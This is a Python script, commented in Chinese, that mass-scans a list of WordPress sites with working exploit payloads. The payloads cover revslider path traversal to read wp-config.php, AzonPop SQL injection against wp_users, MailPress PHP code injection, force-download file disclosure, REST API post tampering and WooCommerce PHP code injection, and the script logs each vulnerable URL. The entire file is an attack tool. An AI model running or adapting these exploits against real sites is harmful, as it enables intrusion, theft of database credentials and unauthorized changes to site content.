import sys
import json
import requests
import warnings



urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    #任意文件下载漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"DB_NAME" in req.text and r"DB_USER" in req.text:
            print("[+]存在wordpress admin-ajax.php任意文件下载漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('任意文件下载漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wordpress_admin_ajax_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #插件后门漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wp-content/plugins/display-widgets/geolocation.php"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False, allow_redirects=False)
        if req.status_code == 200:
            print("[+]存在wordpress display-widgets插件后门漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('插件后门漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wordpress_display_widgets_backdoor漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #插件SQL注入漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(Md5(1234))),0x3c2f62723e,unhex(hex(Md5(1234))))*/,4,5%20/*!00000from*/%20wp_users"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在Wordpress AzonPop插件SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('插件SQL注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wordpress_plugin_azonpop_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #远程代码执行漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wp-content/plugins/mailpress/mp-includes/action.php"
    vulnurl = url + payload
    post_data = {
        "action": "autosave",
        "id": 0,
        "revision": -1,
        "toemail": "",
        "toname": "",
        "fromemail": "",
        "fromname": "",
        "to_list": 1,
        "Theme": "",
        "subject": "<?php phpinfo();?>",
        "html": "",
        "plaintext": "",
        "mail_format": "standard",
        "autosave": 1,
    }
    try:
        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
        start = req.text.find("<autosave id=")
        end = req.text.find("old_id")
        searchkey = req.text[start:end].strip()
        searchid = searchkey.lstrip("<autosave id='").rstrip("'")
        shellurl = url + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" + searchid
        req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
        if r"Configuration File (php.ini) Path" in req2.text:
            print("[+]存在wordpress 插件mailpress远程代码执行漏洞...(高危)\tpayload: " + vulnurl + "\npost: " + json.dumps(post_data,indent=4) + "\nshellurl: " + shellurl,"red")
            with open('远程代码执行漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wordpress_plugin_mailpress_rce漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payloads = ["/force-download.php?file=force-download.php",
                "/wp/wp-content/force-download.php?file=force-download.php",
                "/wp-content/force-download.php?file=force-download.php",
                "/wp-content/themes/ucin/includes/force-download.php?file=force-download.php",
                "/wp-content/uploads/patientforms/force-download.php?file=force-download.php"]
    try:
        for payload in payloads:
            vulnurl = url + payload
            req = requests.get(vulnurl, headers=headers, timeout=5, verify=False)
            if r"<?php" in req.text:
                print("[+]存在wordpress 插件shortcode0.2.3 本地文件包含漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('本地文件包含漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
            else:
                print("[-]不存在wordpress_plugin_ShortCode_lfi漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #内容注入漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type": "application/json"
    }
    payload = "/index.php/wp-json/wp/v2/posts"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        d = json.loads(req.text)
        id_code = d[0]['id']
        vulnurl = url + "/index.php/wp-json/wp/v2/posts/" + str(id_code) + "?id=" + str(id_code) + "a"
        post_data = {
            "title": "81dc9bdb52d04dc20036dbd8313ed055"
        }
        req = requests.post(vulnurl, data=json.dumps(post_data), headers=headers2, timeout=10, verify=False)
        d = json.loads(req.text)
        status = d['data']['status']
        if status != 401 and status != 400:
            print("[+]存在wordpress rest api权限失效导致内容注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('内容注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wordpress_restapi_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #代码注入漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/produits/?items_per_page=%24%7b%40print(md5(1234))%7d&setListingType=grid"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在wordpress 插件WooCommerce PHP代码注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('代码注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在wordpress_woocommerce_code_exec漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

